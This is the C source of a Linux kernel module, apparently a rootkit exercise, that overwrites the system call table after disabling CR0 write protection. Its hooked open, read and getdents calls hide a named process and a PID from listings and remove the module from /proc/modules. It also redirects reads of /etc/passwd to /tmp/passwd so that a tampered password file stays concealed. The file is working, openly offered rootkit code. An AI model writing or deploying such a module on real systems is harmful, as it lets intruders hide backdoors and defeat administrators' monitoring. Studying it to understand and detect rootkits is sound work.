#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h>    // for system call constants
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yunhe Wang");

static int program_pid = 0; // default
static int proc_mod_flag = 0;

module_param(program_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(program_pid, "A program pid");

struct linux_dirent {
  u64 d_ino;     /* Inode number */
  s64 d_off;     /* Offset to next linux_dirent */
  unsigned short d_reclen; /* Length of this linux_dirent */
  char d_name[1024];           /* Filename (null-terminated) */
};

// Macros for kernel functions to alter Control Register 0 (CR0)
// This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
// Bit 0 is the WP-bit (write protection). We want to flip this to 0
// so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

// These are function pointers to the system calls that change page
// permissions for the given address (page) to read-only or read-write.
// Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

// This is a pointer to the system call table in memory
// Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
// We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;

// Function pointer will be used to save address of original 'open' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
// should expect ti find its arguments on the stack (not in registers).
// This is used for all system calls.
asmlinkage int (*original_open)(const char *pathname, int flags);

// Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  const char* fake_pathname = "/tmp/passwd";
  
  if(strcmp(pathname, "/etc/passwd") == 0){
    printk(KERN_INFO "Hided modified passwd!\n");
    copy_to_user((void*)pathname, fake_pathname, strlen(fake_pathname));
  }

  if(strcmp(pathname, "/proc/modules") == 0) {
    proc_mod_flag = 1;
  }
  
  return original_open(pathname, flags);
}

asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
  ssize_t ori = original_read(fd, buf, count);
    
  char* head = strstr((char*)buf, "sneaky_mod");
  if(head && proc_mod_flag){
    char* ptr = head;
    int head_buf_size = strlen(head);
    int count = 0;
    while(1){
      count++;
      ptr++;
      if(*ptr == '\n'){
	ptr++;
	break;
      }
    }
    ori -= count;
    memmove(head, ptr, head_buf_size - count);
    proc_mod_flag = 0;
  }
  
  return ori;
}

asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count);

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                   unsigned int count) {
  int ori = original_getdents(fd, dirp, count);
  struct linux_dirent *tmp_dir = dirp;
  // for tracking
  int rem = ori;
  char pid_str[128];
  int sneaky_flag;
  sprintf(pid_str, "%d", program_pid);

  if(ori <= 0){
    printk(KERN_INFO "empty dirctory or original_getdents error\n");
    return ori;
  }

  while(1){
    char* tmp_dir_name = tmp_dir->d_name;
    unsigned short tmp_dir_len = tmp_dir->d_reclen;
    sneaky_flag = 0;
    rem -= tmp_dir_len;
    printk(KERN_INFO "file name: %s\n", tmp_dir_name);
    if(strcmp(tmp_dir_name, "sneaky_process") == 0){
      printk(KERN_INFO "Hided sneaky_process!\n");
      sneaky_flag = 1;
    }
    if(strcmp(tmp_dir_name, pid_str) == 0){
      printk(KERN_INFO "Hided sneaky_pid!\n");
      sneaky_flag = 1;
    }
    if(sneaky_flag){
      ori -= tmp_dir_len;
      // overwrite
      memmove(tmp_dir, (char*)tmp_dir + tmp_dir_len, rem);
    }
    else{
      if(rem > 0){
	tmp_dir = (struct linux_dirent*)((char*)tmp_dir + tmp_dir_len);
      }
    }
    if(rem <= 0){
      break;
    }
  }

  return ori;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page *page_ptr;

  // See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_open = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  original_read = (void *)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  original_getdents = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
